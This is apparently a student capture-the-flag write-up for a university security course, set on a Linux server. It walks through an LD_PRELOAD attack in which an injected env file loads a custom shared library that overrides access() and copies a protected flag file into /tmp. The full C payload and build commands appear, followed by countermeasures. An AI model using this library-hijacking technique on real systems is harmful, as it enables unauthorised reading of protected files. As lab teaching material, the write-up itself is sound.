# CTF \#4 - Linux Environment

> **Objective:** Explore the influence environment variables have in program's execution in a Linux environment. 
>
> **Target:** [CTF FSI 2023/2024](ctf-fsi.fe.up.pt) at 4006 - Accessible using FEUP private network
>
> The server can be accessed using `netcat` through `nc ctf-fsi.fe.up.pt 4006`.



## Information available in the server

When first accessing the server through `nc ctf-fsi.fe.up.pt 4006`, we see that the shell is launched.

```shell
nobody@15fba786ef2a:/home/flag_reader$
```

Through the `ls` command, we obtain:

```shell
nobody@15fba786ef2a:/home/flag_reader$ ls -sla 
# lists files and directories in a detailed format, including hidden files, with sizes and permissions displayed in a human-readable format
total 56
 4 drwxr-xr-x 1 flag_reader flag_reader  4096 Oct  8 16:44 .
 8 drwxr-xr-x 1 root        root         4096 Oct  8 16:44 ..
 4 -rw-r--r-- 1 flag_reader flag_reader   220 Feb 25  2020 .bash_logout
 4 -rw-r--r-- 1 flag_reader flag_reader  3771 Feb 25  2020 .bashrc
 4 -rw-r--r-- 1 flag_reader flag_reader   807 Feb 25  2020 .profile
 4 -r--r--r-- 1 root        flag_reader   293 Oct  8 16:40 admin_note.txt
 0 lrwxrwxrwx 1 flag_reader flag_reader     8 Oct  8 16:44 env -> /tmp/env
 0 lrwxrwxrwx 1 flag_reader flag_reader    13 Oct  8 16:44 last_log -> /run/last_log
 4 -rw-r--r-- 1 flag_reader flag_reader   366 Oct  8 16:40 main.c
 4 -rwxr-xr-x 1 flag_reader flag_reader   222 Oct  8 16:40 my_script.sh
20 -rwxrwxr-x 1 flag_reader flag_reader 16776 Oct  8 16:44 reader
```

Seeing our file permissions, we can do the following:

```shell
nobody@15fba786ef2a:/home/flag_reader$ cat admin_note.txt
flag_reader,

I locked you out of the temp folders.
Told you before they are not to be used as permanent storage!
Hackers stole the flag by reading the files you left there!!!!!!
Finish your damn program ASAP!!!!!
Tired of waiting for you to lock them out for good, you lazy !@%#

- The Admin
nobody@15fba786ef2a:/home/flag_reader$ env
SHELL=/usr/sbin/nologin
HOSTNAME=15fba786ef2a
SOCAT_PEERADDR=10.227.158.32
PWD=/home/flag_reader
LOGNAME=nobody
SOCAT_PEERPORT=34694
HOME=/nonexistent
USER=nobody
SHLVL=1
SOCAT_PPID=77
SOCAT_SOCKADDR=10.146.32.2
SOCAT_SOCKPORT=4006
SOCAT_PID=309324
S6_READ_ONLY_ROOT=1
PATH=/command:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SOCAT_VERSION=1.7.3.3
OLDPWD=/run/s6/legacy-services/socat
_=/usr/bin/env
```

The cat command suggests that we might be able to obtain the flag through the temp folder. In addition to that, the `env` command allows us to see our environment variables. The following `main` function shows us the program that is mentioned in the the text file and the `my_script.sh` is run to use said program.

```shell
nobody@15fba786ef2a:/home/flag_reader$ cat main.c
#include <stdio.h>
#include <unistd.h>

void my_big_congrats(){
    puts("TODO - Implement this in the near future!");
}

int main() {
    puts("I'm going to check if the flag exists!");

    if (access("/flags/flag.txt", F_OK) == 0) {
        puts("File exists!!");
        my_big_congrats();
    } else {
        puts("File doesn't exist!");
    }

    return 0;
}
nobody@15fba786ef2a:/home/flag_reader$ cat my_script.sh
#!/bin/bash

if [ -f "/home/flag_reader/env" ]; then
    echo "Sourcing env"
    export $(/usr/bin/cat /home/flag_reader/env | /usr/bin/xargs)
    echo "" > /home/flag_reader/env
fi

printenv
exec /home/flag_reader/reader
```

Thus, we have determined that the flag that we intend to access is in the location `/flags/flag.txt`. However, when running `cd /flags/flag.txt` we obtain permission denied as we are locked out of that folder. 

Therefore, we decided to go to our root folder and see what we had available to work with.

```shell
nobody@15fba786ef2a:/$ ls -sla
total 84
 4 drwxr-xr-x      1 root root         4096 Oct  8 16:44 .
 4 drwxr-xr-x      1 root root         4096 Oct  8 16:44 ..
 0 -rwxr-xr-x      1 root root            0 Oct  8 16:44 .dockerenv
 0 lrwxrwxrwx      1 root root            7 Aug  1 02:04 bin -> usr/bin
 4 drwxr-xr-x      2 root root         4096 Apr 15  2020 boot
12 drwxr-xr-x      1 root root        12288 Aug 29  2022 command
 0 drwxr-xr-x      5 root root          340 Oct 20 20:29 dev
 4 drwxr-xr-x      1 root root         4096 Oct  8 16:44 etc
 0 drwxr-x---      2 root flag_reader    60 Oct 20 20:29 flags
 8 drwxr-xr-x      1 root root         4096 Oct  8 16:44 home
 4 -rwxr-xr-x      1 root root          907 Aug 29  2022 init
 0 lrwxrwxrwx      1 root root            7 Aug  1 02:04 lib -> usr/lib
 0 lrwxrwxrwx      1 root root            9 Aug  1 02:04 lib32 -> usr/lib32
 0 lrwxrwxrwx      1 root root            9 Aug  1 02:04 lib64 -> usr/lib64
 0 lrwxrwxrwx      1 root root           10 Aug  1 02:04 libx32 -> usr/libx32
 4 drwxr-xr-x      2 root root         4096 Aug  1 02:04 media
 4 drwxr-xr-x      2 root root         4096 Aug  1 02:04 mnt
 4 drwxr-xr-x      2 root root         4096 Aug  1 02:04 opt
 8 drwxr-xr-x      1 root root         4096 Aug 29  2022 package
 0 dr-xr-xr-x  11257 root root            0 Oct 20 20:29 proc
 4 drwx------      1 root root         4096 Oct  8 16:44 root
 0 drwxr-xr-x      6 root root          200 Oct 20 20:29 run
 0 lrwxrwxrwx      1 root root            8 Aug  1 02:04 sbin -> usr/sbin
 4 drwxr-xr-x      2 root root         4096 Aug  1 02:04 srv
 0 dr-xr-xr-x     13 root root            0 Oct 20 20:29 sys
 0 drwxrwxrwx+     2 root root          140 Oct 20 21:10 tmp
 8 drwxr-xr-x      1 root root         4096 Aug  1 02:04 usr
 8 drwxr-xr-x      1 root root         4096 Aug  1 02:07 var
nobody@15fba786ef2a:/tmp$ ls -sla
total 40
 0 drwxrwxrwx+ 2 root   root      140 Oct 19 08:41 .
 4 drwxr-xr-x  1 root   root     4096 Oct  8 16:44 ..
```

As we can see we have ` 0 drwxrwxrwx+	2 root root	140 Oct 20 21:10 tmp` and we can freely work in that folder.

## Attack

When analysing the `/home/flag_reader` directory, we checked that the flag_reader had a script that has access to the environment variables of our system through the `env` command and runs the `reader` file, the compiled version of our `main` function. 

As can be seen, the function makes a call to the `access` function and since the program is owned by the flag_reader user it has access to the `flags` folder. 

```
if (access("/flags/flag.txt", F_OK) == 0) 
```

Thus, we have our goal, to create a program that will replace the default `access` function and use a custom function that will give us the contents of the folder.

In order to do so, we will make use of the **LD_PRELOAD** environment variable and our knowledge of **dynamic link libraries**.

We created the custom `access` function. As we can see, the `system` call makes use of the `cat` command to output the contents of the `flag.txt`into the `test.txt` file.

```c
#include <stdio.h>
#include <stdlib.h>

int access(const char *pathname, int mode){
system("/usr/bin/cat /flags/flag.txt > /tmp/test.txt");
return 0;
}
```

With this function created, we will have to run a group of commands to obtain our flag.

```shell
echo "LD_PRELOAD=/tmp/test.so.1.0.1" > env;
# Sets the LD_PRELOAD environment variable to point to the library we will create located in the /tmp directory.
cd /tmp;
# We change our PWD to the /tmp directory
echo '#include <stdio.h>
#include <stdlib.h>
int access(const char *pathname, int mode){
system("/usr/bin/cat /flags/flag.txt > /tmp/test.txt");
return 0;
}' > test.c;
# We create a C source code file named "test.c" and we write through 'echo' our custom function into it
gcc -fPIC -g -c test.c;
# This line compiles the "test.c" source code into an object file (test.o) with position-independent code (-fPIC) and debugging information (-g).
gcc -shared -o test.so.1.0.1 test.o -lc;
# This compiles the previously created object file into a shared object file named "test.so.1.0.1" with the -shared option.
# "test.so.1.0.1" is what will be used when the LD_PRELOAD variable is used.
touch test.txt; 
# This command creates an empty file named "test.txt" in the /tmp directory.
chmod 777 test.txt;
# This sets full read, write, and execute permissions for all users (777) on the "test.txt" file, which makes it accessible by anyone.
cat test.txt
```

The code within the single quotes is our custom C program that intercepts the `access` system call and, when called, executes a command to read the contents of the `/flags/flag.txt` file and save it in a file named `"test.txt"` within the `/tmp` directory.

And so we have the conditions required to obtain our flag.

## Result

```shell
[10/20/23]seed@VM:~$ nc ctf-fsi.fe.up.pt 4006
nobody@15fba786ef2a:/home/flag_reader$ echo "LD_PRELOAD=/tmp/test.so.1.0.1" > env;
cd /tmp;
echo '#include <stdio.h>
#include <stdlib.h>
int access(const char *pathname, int mode){
system("/usr/bin/cat /flags/flag.txt > /tmp/test.txt");
return 0;
}' > test.c;
gcc -fPIC -g -c test.c;
gcc -shared -o test.so.1.0.1 test.o -lc;
touch test.txt; 
chmod 777 test.txt;
cat test.txt
nobody@15fba786ef2a:/home/flag_reader$ nobody@15fba786ef2a:/tmp$ > > > > > nobody@15fba786ef2a:/tmp$ nobody@15fba786ef2a:/tmp$ nobody@15fba786ef2a:/tmp$ nobody@15fba786ef2a:/tmp$ nobody@15fba786ef2a:/tmp$ 
flag{4e8606cd039a0ef4e13785f85f90eff6}
# We obtained our flag
```

## Possible countermeasures

1. **Access Control**:
   - Ensure that users only have the least privilege necessary to perform their tasks.
3. **Environment Variable Restrictions**:
   - Limit the use of environment variables. If environment variables are necessary, we should ensure they cannot be easily manipulated to exploit common vulnerabilities.
4. **Dynamic Link Libraries (DLL) Security**:
   - Be cautious with the use of LD_PRELOAD and similar mechanisms that allow users to load custom shared libraries. Limiting this functionality can prevent unauthorized interception of system calls.
5. **Input Validation**:
   - Implement strict input validation in the `flag_reader`'s program to prevent unauthorized access or manipulation of system calls.

Overall, what should be kept in mind is that this can be easily prevented by restricting the possibility of subverting the access  funtion.